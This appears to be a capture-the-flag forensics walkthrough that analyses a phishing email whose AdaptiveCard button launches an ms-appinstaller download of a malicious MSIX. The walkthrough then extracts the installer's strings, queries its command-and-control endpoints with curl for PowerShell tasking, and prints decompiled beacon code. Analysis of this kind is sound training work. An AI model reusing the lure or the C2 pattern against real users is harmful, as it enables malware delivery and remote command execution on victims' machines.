# Youve got mail 2!

Walkthrough by Hero

---

## Analyzing the zip

We check and extract the file from the handout

```txt [18]
❯ 7z l forensics_youvegotmailtwo.zip

7-Zip [64] 17.05 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
p7zip Version 17.05 (locale=en_DK.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs x64)

Scanning the drive for archives:
1 file, 27004 bytes (27 KiB)

Listing archive: forensics_youvegotmailtwo.zip

--
Path = forensics_youvegotmailtwo.zip
Type = zip
Physical Size = 27004

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2026-02-19 00:16:21 .....        50978        26786  Credentials for CTFd.eml
------------------- ----- ------------ ------------  ------------------------
2026-02-19 00:16:21              50978        26786  1 files
```

---

## Mail contents

Hmm, some HTML file, but formatted with MIME

```html
❯ tail -n +246 Credentials\ for\ CTFd.eml | head -n 12
 MIME-Version: 1.0

--=-lXgsQmv6h9XTdkz5abXc8g==
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.=
w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html dir=3D"ltr" xmlns=3D"ht=
tp://www.w3.org/1999/xhtml" lang=3D"en-us" xmlns:o=3D"urn:schemas-microsoft=
-com:office:office"><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8"><s=
tyle type=3D"text/css">
```

---

## Extracting MIME

We extract the MIME contents and find a signed AdaptiveCard

```html [1|15]
❯ nix-shell -p ripmime --run "ripmime -i Credentials\ for\ CTFd.eml -d mime-out"
❯ ls mime-out
60348351-9852-4771-8d76-8d90a061c05c  713df6ac-e0f7-4ec9-87f2-9de83d8086ef  9f46768a-a6ac-4c85-8776-6ea88787cf7f  textfile0  textfile1
❯ head -n 13 textfile1
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html dir="ltr" xmlns="http://www.w
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"><style type="text/css">
    .headerBackgroundMsoTable {
        border-spacing: 0px;
        width: 100%;
    }
</style>
<script type="application/ld+json" id="ActionableMessageCardScript"> {
  "@type": "SignedAdaptiveCard",
  "@context": "http://schema.org/extensions",
  "signedAdaptiveCard": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6Ik1JSUpTekNDQnpPZ0F3SUJBZ0lUVlFBRE5RWVJReDljd1lLVW5RQUFBQU0xQmpBTkJna3Foa2lHOXcwQkFRd0ZgIml0ZW1zIjogW1xuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgInR5cGUiOiAiVGV4dEJsb2NrIixcbiAgICAgICAgICAgICAgICAgICAgImlkIjogImMzMTk4ODU2LWU3NWItNDIxMy04YjAyLWY0Mzk2MzcxNTBjZCIsXG4gICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkVycm9yISIsXG4gICAgICAgICAgICAgICAgICAgICJ3cmFwIjogdHJ1ZSxcbiAgICAgICAgICAgICAgICAgICAgInNpemUiOiAiTGFyZ2UiLFxuICAgICAgICAgICAgICAgICAgICAid2VpZ2h0IjogIkJvbGRlciJcbiAgICAgICAgICAgICAgICB9LFxuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgInR5cGUiOiAiVGV4dEJsb2NrIixcbiAgICAgICAgICAgICAgICAgICAgImlkIjogIjFhOWFhZmVjLTQwMmItNzlmYi0zNDBjLWNjY2I3MTU0MjMzNSIsXG4gICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIllvdXIgbWFjaGluZSBkb2VzIG5vdCBzdXBwb3J0IHRoZSByZXF1aXJlZCBmZWF0dXJlcyBmb3Igb3BlbmluZyBhbiBlbmNyeXB0ZWQgZW1haWwuIFBsZWFzZSBlbmFibGUgdGhlIGZlYXR1cmUgdG8gdmlldyB0aGUgbWVzc2FnZSIsXG4gICAgICAgICAgICAgICAgICAgICJ3cmFwIjogdHJ1ZVxuICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAidHlwZSI6ICJBY3Rpb25TZXQiLFxuICAgICAgICAgICAgICAgICAgICAiaWQiOiAiYjc0Y2Q2ZTgtNjMzOC1lMzZjLWZhNGEtNzNmZTBhMzA5MGRmIixcbiAgICAgICAgICAgICAgICAgICAgImFjdGlvbnMiOiBbXG4gICAgICAgICAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgInR5cGUiOiAiQWN0aW9uLk9wZW5VcmwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpZCI6ICIzNWUwNGQzYy1jOGZlLWNhYWItOWRiOC1jYWE1NGIwMDgzZmEiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJFbmFibGUgRmVhdHVyZSIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgInVybCI6ICJtcy1hcHBpbnN0YWxsZXI6P3NvdXJjZT1odHRwczovL3NlY3VyZWVtYWlsLmN0ZnRlY2gudWsvaW5zdGFsbGVyLm1zaXgiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzdHlsZSI6ICJwb3NpdGl2ZSIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgImlzUHJpbWFyeSI6IHRydWVcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgXSxcbiAgICAgICAgICAgICAgICAgICAgImhvcml6b250YWxBbGlnbm1lbnQiOiAiUmlnaHQiXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgXSxcbiAgICAgICAgICAgICJpc1Zpc2libGUiOiBmYWxzZVxuICAgICAgICB9LFxuICAgICAgICB7XG4gICAgICAgICAgICAidHlwZSI6ICJDb250YWluZXIiLFxuICAgICAgICAgICAgImlkIjogInBhZ2UxIixcbiAgICAgICAgICAgICJwYWRkaW5nIjogIkRlZmF1bHQiLFxuICAgICAgICAgICAgInNwYWNpbmciOiAiTm9uZSIsXG4gICAgICAgICAgICAiaXRlbXMiOiBbXG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAidHlwZSI6ICJUZXh0QmxvY2siLFxuICAgICAgICAgICAgICAgICAgICAiaWQiOiAiNDQ5MDY3OTctMjIyZi05ZmUyLTBiN2EtZTNlZTIxYzZlMzgwIixcbiAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiWW91IGhhdmUgYSBuZXcgZW5jcnlwdGVkIGVtYWlsIixcbiAgICAgICAgICAgICAgICAgICAgIndyYXAiOiB0cnVlLFxuICAgICAgICAgICAgICAgICAgICAid2VpZ2h0IjogIkJvbGRlciIsXG4gICAgICAgICAgICAgICAgICAgICJzaXplIjogIkxhcmdlIixcbiAgICAgICAgICAgICAgICAgICAgInN0eWxlIjogImhlYWRpbmciXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgICJ0eXBlIjogIlRleHRCbG9jayIsXG4gICAgICAgICAgICAgICAgICAgICJpZCI6ICJmN2FiZGYxYS0zY2NlLTIxNTktMjhlZi1mMmYzNjJlYzkzN2UiLFxuICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJZb3UgaGF2ZSByZWNpZXZlZCBhbiBlbmNyeXB0ZWQgZW1haWwgZnJvbSBcXCJqZW5zLm15cnVwQGN5YmVybWVzdGVyc2thYmVybmUuZGRjXFwiIHdpdGggdGhlIHN1YmplY3QgXFwiQ3JlZGVudGlhbHMgZm9yIENURmRcXCIiLFxuICAgICAgICAgICAgICAgICAgICAid3JhcCI6IHRydWVcbiAgICAgICAgICAgICAgICB9LFxuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgInR5cGUiOiAiQWN0aW9uU2V0IixcbiAgICAgICAgICAgICAgICAgICAgImlkIjogImE0YjdmNmZhLWYwOWMtMzI0MC0wMTA3LWJhOTZkYTUwNDcxYyIsXG4gICAgICAgICAgICAgICAgICAgICJhY3Rpb25zIjogW1xuICAgICAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0eXBlIjogIkFjdGlvbi5Ub2dnbGVWaXNpYmlsaXR5IixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaWQiOiAiZDg2OTA1NmMtZTQzNi0xOGYxLTE5MzgtYTAzN2RhNmRiOGM4IixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAidGl0bGUiOiAiVmlldyBtZXNzYWdlIixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAidGFyZ2V0RWxlbWVudHMiOiBbXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJlbGVtZW50SWQiOiAicGFnZTEiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImlzVmlzaWJsZSI6IGZhbHNlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJlbGVtZW50SWQiOiAicGFnZTIiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImlzVmlzaWJsZSI6IHRydWVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgInN0eWxlIjogInBvc2l0aXZlIixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaXNQcmltYXJ5IjogdHJ1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBdLFxuICAgICAgICAgICAgICAgICAgICAiaG9yaXpvbnRhbEFsaWdubWVudCI6ICJSaWdodCJcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICBdXG4gICAgICAgIH1cbiAgICBdLFxuICAgICJwYWRkaW5nIjogIk5vbmUiLFxuICAgICJAdHlwZSI6ICJBZGFwdGl2ZUNhcmQiLFxuICAgICJAY29udGV4dCI6ICJodHRwOi8vc2NoZW1hLm9yZy9leHRlbnNpb25zIixcblx0ZXhwZWN0ZWRBY3RvcnM6IFtcbiAgXHQgIG51bGxcblx0XSxcblx0aGlkZU9yaWdpbmFsQm9keTogdHJ1ZSxcblx0cnRsOiBmYWxzZVxufSIsImlhdCI6IjE3NzE0MjcwODgiLCJyZWNpcGllbnRzU2VyaWFsaXplZCI6IltcIm9mZmVyLnNvZXJlbnNlbkBob3RtYWlsLmRkY1wiXSJ9"
} </script></head>
<body style="margin: 0px">
```

---

## Get the adaptive card

```json
❯ grep -oP '"signedAdaptiveCard": "\K[^"]+' textfile1 | base64 -d
{"alg":"RS256","typ":"JWT","x5c":"M...5XjQ=="}
{"sender":"jens.myrup@carnpfire.ddc",
"originator":"abd17b4b-e363-497a-90dc-a1a63b3b95c5",
"adaptiveCardSerialized":"{\n    "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",\n
```

---

## De-serialize

```json
{
    "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
    "type": "AdaptiveCard",
    "version": "1.0",
    "body": [
        ...
    ]
}
```

---

## Finding the malware

```json [5|16]
[
	{
		"type": "TextBlock",
		"id": "1a9aafec-402b-79fb-340c-cccb71542335",
		"text": "Your machine does not support the required features for opening an encrypted email. Please enable the feature to view the message",
		"wrap": true
	},
	{
		"type": "ActionSet",
		"id": "b74cd6e8-6338-e36c-fa4a-73fe0a3090df",
		"actions": [
			{
				"type": "Action.OpenUrl",
				"id": "35e04d3c-c8fe-caab-9db8-caa54b0083fa",
				"title": "Enable Feature",
				"url": "ms-appinstaller:?source=https://secureemail.ctftech.uk/installer.msix",
				"style": "positive",
				"isPrimary": true
			}
		],
		"horizontalAlignment": "Right"
	}
]
```

---

## Download the malware

```txt
❯ wget https://secureemail.ctftech.uk/installer.msix
--2026-04-10 22:31:59--  https://secureemail.ctftech.uk/installer.msix
Resolving secureemail.ctftech.uk (secureemail.ctftech.uk)... 188.114.96.1, 188.114.97.1, 2a06:98c1:3120::1, ...
Connecting to secureemail.ctftech.uk (secureemail.ctftech.uk)|188.114.96.1|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 82360 (80K) [application/octet-stream]
Saving to: ‘installer.msix’

installer.msix        100%[===========>]  80,43K  --.-KB/s    in 0,01s

2026-04-10 22:31:59 (6,81 MB/s) - ‘installer.msix’ saved [82360/82360]
```

---

## Ever heard of `strings`?

Remember to check for UTF-16 encoded stuff in Windows binaries!

```txt [1|3|48|64-66]
❯ file installer.msix
installer.msix: Zip archive data, at least v4.5 to extract, compression method=deflate
❯ 7z x installer.msix -oinstaller

7-Zip [64] 17.05 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
p7zip Version 17.05 (locale=en_DK.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs x64)

Scanning the drive for archives:
1 file, 82360 bytes (81 KiB)

Extracting archive: installer.msix
--
Path = installer.msix
Type = zip
Physical Size = 82360
64-bit = +
Characteristics = Zip64


Would you like to replace the existing file:
  Path:     installer/AppxManifest.xml
  Size:     0 bytes
  Modified: 2026-04-10 22:45:04
with the file from archive:
  Path:     AppxManifest.xml
  Size:     1892 bytes (2 KiB)
  Modified: 2026-02-18 22:30:44
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y


Would you like to replace the existing file:
  Path:     installer/[Content_Types].xml
  Size:     0 bytes
  Modified: 2026-04-10 22:45:06
with the file from archive:
  Path:     [Content_Types].xml
  Size:     409 bytes (1 KiB)
  Modified: 2026-02-18 22:30:44
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

Everything is Ok

Files: 6
Size:       151303
Compressed: 82360
❯ ls installer
 AppxBlockMap.xml   AppxManifest.xml   Assets  '[Content_Types].xml'   main.exe
❯ for f in installer/*; do echo $f; strings -el $f; done > installer_strings
strings: Warning: 'installer/Assets' is a directory
❯ head -n 16 installer_strings
installer/AppxBlockMap.xml
installer/AppxManifest.xml
installer/Assets
installer/[Content_Types].xml
installer/main.exe
jjjj
jjjjjj
jjjj
jjjjj
WinHTTP JSON Client/1.0
WinHTTP JSON Client/1.0
POST
Content-Type: application/json
/api/args
long-recipe-da01.oluf-sand.workers.dev
/api/result
```

---

## C2 Communication

For some reason if you keep requesting args we get flag without sending results

```json
❯ curl long-recipe-da01.oluf-sand.workers.dev/api/args
["powershell.exe", "-c", "whoami"]
❯ curl long-recipe-da01.oluf-sand.workers.dev/api/args
["powershell.exe", "-c", "hostname"]
❯ curl long-recipe-da01.oluf-sand.workers.dev/api/args
["powershell.exe", "-c", "dir C:/"]
❯ curl long-recipe-da01.oluf-sand.workers.dev/api/args
["powershell.exe", "-c", "echo DDC{pl34s3_t3ll_m3_y0u_r4n_th1s_1n_4_s4ndb0x} > C:/Windows/Temp/71ad8DBP.tmp"]
```

Flag got!
`DDC{pl34s3_t3ll_m3_y0u_r4n_th1s_1n_4_s4ndb0x}`

---

## But what about sending results?

```txt
❯ curl -X POST long-recipe-da01.oluf-sand.workers.dev/api/result \
  -H "Content-Type: application/json" \
  -d '{"output":"offer","exit_code":0}'
```

Satisfied now? ...no?

---

## Needs more rev

I agree, let's rev it!

```c [17-22|32-36]
0041c1e4  wchar16 const data_41c1e4[0x18] = "WinHTTP JSON Client/1.0", 0

0041c214  data_41c214:
0041c214              47 00 45 00 54 00 00 00                  G.E.T...

0041c21c  wchar16 const data_41c21c[0x18] = "WinHTTP JSON Client/1.0", 0
0041c24c  wchar16 const data_41c24c[0x5] = "POST", 0

0041c256                    00 00                                ..

0041c258  wchar16 const data_41c258[0x21] = "Content-Type: application/json\r\n", 0

0041c29a                                00 00 22 00 22 00            ..".".
0041c2a0  00 00 00 00 20 00 09 00 0a 00 0b 00 22 00 00 00  .... ......."...
0041c2b0  22 00 00 00                                      "...

0041c2b4  wchar16 const data_41c2b4[0xa] = "/api/args", 0
0041c2c8  wchar16 const data_41c2c8[0x27] = "long-recipe-da01.oluf-sand.workers.dev", 0

0041c316                    00 00                                ..

0041c318  wchar16 const data_41c318[0xc] = "/api/result", 0
0041c330  char const data_41c330[0x23] = "Failed to fetch JSON from server.\n", 0

0041c353           00                                         .

0041c354  char const data_41c354[0x28] = "Failed to parse JSON array of strings.\n", 0
0041c37c  char const data_41c37c[0x1c] = "Failed to run example.exe.\n", 0

0041c398                          7d 00 00 00                      }...

0041c39c  char const data_41c39c[0xf] = "\",\"exit_code\":", 0

0041c3ab                                   00                         .

0041c3ac  char const data_41c3ac[0xc] = "{\"output\":\"", 0
0041c3b8  char const data_41c3b8[0x20] = "Failed to POST JSON to server.\n", 0
```

---

## Makes more sense now?

```c [13-20|57-59]
00402270    int16_t* sub_402270()

00402270    {
00402270        int32_t var_8 = 0xffffffff;
00402275        int32_t (* var_c)(void* arg1) = sub_41af06;
00402280        TEB* fsbase;
00402280        struct _EXCEPTION_REGISTRATION_RECORD* ExceptionList = fsbase->NtTib.ExceptionList;
0040228c        int32_t __saved_ebp;
0040228c        int32_t eax_2 = __security_cookie ^ &__saved_ebp;
00402291        int32_t var_184 = eax_2;
00402295        fsbase->NtTib.ExceptionList = &ExceptionList;
004022a3        void var_44;
004022a3        sub_404850(&var_44, u"long-recipe-da01.oluf-sand.workers.dev");
004022a8        int32_t var_8_1 = 0;
004022b4        int16_t var_150 = 0x1bb;
004022c3        void var_74;
004022c3        sub_404850(&var_74, u"/api/args");
004022c8        (uint8_t)var_8_1 = 1;
004022d4        void var_5c;
004022d4        sub_404850(&var_5c, u"/api/result");
004022d9        (uint8_t)var_8_1 = 2;
004022e0        void var_2c;
004022e0        sub_404650(&var_2c);
004022e5        (uint8_t)var_8_1 = 3;
00402307        int16_t* result;
00402307
00402307        if ((uint32_t)sub_401980(&var_44, 0x1bb, &var_74, &var_2c))
00402307        {
0040236c            int32_t var_14c;
0040236c            sub_404920(&var_14c);
00402371            (uint8_t)var_8_1 = 4;
00402371
0040238d            if ((uint32_t)sub_401470(&var_2c, &var_14c))
0040238d            {
00402401                void var_a4;
00402401                sub_404650(&var_a4);
00402406                (uint8_t)var_8_1 = 5;
0040240a                uint32_t var_140 = 0;
0040240a
00402436                if ((uint32_t)sub_401e80(&var_14c, &var_a4, &var_140))
00402436                {
004024c1                    void var_134;
004024c1                    int32_t* eax_10 = sub_407010(&var_134, var_140);
004024db                    (uint8_t)var_8_1 = 6;
00402518                    (uint8_t)var_8_1 = 7;
00402549                    (uint8_t)var_8_1 = 8;
00402575                    (uint8_t)var_8_1 = 9;
004025b9                    (uint8_t)var_8_1 = 0xa;
004025cb                    void var_11c;
004025cb                    void var_104;
004025cb                    void var_ec;
004025cb                    void var_d4;
004025cb                    void var_bc;
004025cb                    sub_402970(&var_bc,
004025cb                        sub_402930(&var_d4,
004025cb                            sub_402970(&var_ec,
004025cb                                sub_4029b0(&var_104, "{"output":"",
004025cb                                    sub_401630(&var_11c, &var_a4)),
004025cb                                "","exit_code":"),
004025cb                            eax_10),
004025cb                        "}");
004025d3                    (uint8_t)var_8_1 = 0xc;
004025dd                    sub_404b30(&var_d4);
004025e2                    (uint8_t)var_8_1 = 0xd;
004025ec                    sub_404b30(&var_ec);
004025f1                    (uint8_t)var_8_1 = 0xe;
004025fb                    sub_404b30(&var_104);
00402600                    (uint8_t)var_8_1 = 0xf;
0040260a                    sub_404b30(&var_11c);
0040260f                    (uint8_t)var_8_1 = 0x10;
00402619                    sub_404b30(&var_134);
00402624                    void var_8c;
00402624                    sub_404650(&var_8c);
00402629                    (uint8_t)var_8_1 = 0x11;
00402629
00402655                    if ((uint32_t)sub_401ad0(&var_44, 0x1bb, &var_5c, &var_bc, &var_8c))
00402655                    {
004026ff                        if (!(uint32_t)sub_4068d0(&var_8c))
00402704                        {
00402711                            int32_t* var_188_5 = sub_4060c0(&var_8c);
00402717                            sub_4070f0(0x41c3d8);
00402704                        }
00402704
0040271f                        char var_139_1 = 1;
00402726                        (uint8_t)var_8_1 = 0x10;
00402730                        sub_404b30(&var_8c);
00402735                        (uint8_t)var_8_1 = 5;
0040273f                        sub_404b30(&var_bc);
00402744                        (uint8_t)var_8_1 = 4;
0040274e                        sub_404b30(&var_a4);
00402753                        (uint8_t)var_8_1 = 3;
0040275d                        sub_404b70(&var_14c);
00402762                        (uint8_t)var_8_1 = 2;
00402769                        sub_404b30(&var_2c);
0040276e                        (uint8_t)var_8_1 = 1;
00402775                        sub_404b50(&var_5c);
0040277a                        (uint8_t)var_8_1 = 0;
00402781                        sub_404b50(&var_74);
00402786                        int32_t var_8_6 = 0xffffffff;
00402790                        sub_404b50(&var_44);
00402795                        (uint8_t)result = var_139_1;
00402655                    }
00402655                    else
00402655                    {
0040266b                        _fwprintf(sub_40a628(2), "Failed to POST JSON to server.\n");
00402673                        char var_138_1 = 0;
0040267a                        (uint8_t)var_8_1 = 0x10;
00402684                        sub_404b30(&var_8c);
00402689                        (uint8_t)var_8_1 = 5;
00402693                        sub_404b30(&var_bc);
00402698                        (uint8_t)var_8_1 = 4;
004026a2                        sub_404b30(&var_a4);
004026a7                        (uint8_t)var_8_1 = 3;
004026b1                        sub_404b70(&var_14c);
004026b6                        (uint8_t)var_8_1 = 2;
004026bd                        sub_404b30(&var_2c);
004026c2                        (uint8_t)var_8_1 = 1;
004026c9                        sub_404b50(&var_5c);
004026ce                        (uint8_t)var_8_1 = 0;
004026d5                        sub_404b50(&var_74);
004026da                        int32_t var_8_5 = 0xffffffff;
004026e4                        sub_404b50(&var_44);
004026e9                        (uint8_t)result = var_138_1;
00402655                    }
00402436                }
00402436                else
00402436                {
00402448                    _fwprintf(sub_40a628(2), "Failed to run example.exe.\n");
00402450                    char var_137_1 = 0;
00402457                    (uint8_t)var_8_1 = 4;
00402461                    sub_404b30(&var_a4);
00402466                    (uint8_t)var_8_1 = 3;
00402470                    sub_404b70(&var_14c);
00402475                    (uint8_t)var_8_1 = 2;
0040247c                    sub_404b30(&var_2c);
00402481                    (uint8_t)var_8_1 = 1;
00402488                    sub_404b50(&var_5c);
0040248d                    (uint8_t)var_8_1 = 0;
00402494                    sub_404b50(&var_74);
00402499                    int32_t var_8_4 = 0xffffffff;
004024a3                    sub_404b50(&var_44);
004024a8                    (uint8_t)result = var_137_1;
00402436                }
0040238d            }
0040238d            else
0040238d            {
0040239f                _fwprintf(sub_40a628(2), "Failed to parse JSON array of strings.\n");
004023a7                char var_136_1 = 0;
004023ae                (uint8_t)var_8_1 = 3;
004023b8                sub_404b70(&var_14c);
004023bd                (uint8_t)var_8_1 = 2;
004023c4                sub_404b30(&var_2c);
004023c9                (uint8_t)var_8_1 = 1;
004023d0                sub_404b50(&var_5c);
004023d5                (uint8_t)var_8_1 = 0;
004023dc                sub_404b50(&var_74);
004023e1                int32_t var_8_3 = 0xffffffff;
004023eb                sub_404b50(&var_44);
004023f0                (uint8_t)result = var_136_1;
0040238d            }
00402307        }
00402307        else
00402307        {
00402319            _fwprintf(sub_40a628(2), "Failed to fetch JSON from server.\n");
00402321            char var_135_1 = 0;
00402328            (uint8_t)var_8_1 = 2;
0040232f            sub_404b30(&var_2c);
00402334            (uint8_t)var_8_1 = 1;
0040233b            sub_404b50(&var_5c);
00402340            (uint8_t)var_8_1 = 0;
00402347            sub_404b50(&var_74);
0040234c            int32_t var_8_2 = 0xffffffff;
00402356            sub_404b50(&var_44);
0040235b            (uint8_t)result = var_135_1;
00402307        }
00402307
0040279e        fsbase->NtTib.ExceptionList = ExceptionList;
004027ab        sub_40739f(eax_2 ^ &__saved_ebp);
004027b3        return result;
00402270    }
```

---

## But what about `Youve got mail!` ?

**TL;DR:** Remove executing parts of PowerShell commands and keep the parts that decode.
